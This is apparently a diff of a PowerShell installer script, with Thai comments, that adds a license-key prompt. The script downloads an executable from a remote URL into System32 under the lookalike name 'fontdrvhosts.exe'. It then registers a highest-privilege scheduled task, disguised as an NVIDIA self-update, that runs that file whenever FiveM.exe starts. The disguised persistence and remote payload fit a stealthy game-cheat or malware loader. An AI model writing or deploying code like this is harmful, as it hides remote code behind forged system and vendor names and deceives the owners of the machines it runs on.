@@ -25,22 +25,33 @@ $databasePath = Join-Path $system32Path "database.txt"
 $exeUrl        = "https://12bitservices.com/upload/files/2026/01/pfYdi41re0.exe"
 $taskName      = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
 
+# --- ตรงนี้คือคีย์ที่คุณต้องใส่ ---
+$validKey = "123"
+
 # -----------------------------
 # Install Mode
 # -----------------------------
 if ($choice -eq "1") {
-Write-Host "Starting installation..."
-Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
-$key = "123"
-$regPath = "HKCU:\Software\NVIDIAApp"
-
-$regName = "LicenseKey"
-if (-not (Test-Path $regPath)) {
-
-New-Item -Path $regPath -Force | Out-Null
-}
-Set-ItemProperty -Path $regPath -Name $regName -Value $key
-
+    # ถามคีย์
+    $userKey = Read-Host "Enter License Key"
+    
+    # ตรวจสอบคีย์
+    if ($userKey -ne $validKey) {
+        Write-Host "Invalid Key!" -ForegroundColor Red
+        Read-Host "Press Enter to exit"
+        exit
+    }
+    
+    Write-Host "Key Verified! Starting installation..." -ForegroundColor Green
+    
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
+    
+    $regPath = "HKCU:\Software\NVIDIAApp"
+    $regName = "LicenseKey"
+    if (-not (Test-Path $regPath)) {
+        New-Item -Path $regPath -Force | Out-Null
+    }
+    Set-ItemProperty -Path $regPath -Name $regName -Value $userKey
     # Create scheduled task
     $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /rl HIGHEST /f'
 Invoke-Expression $cmd
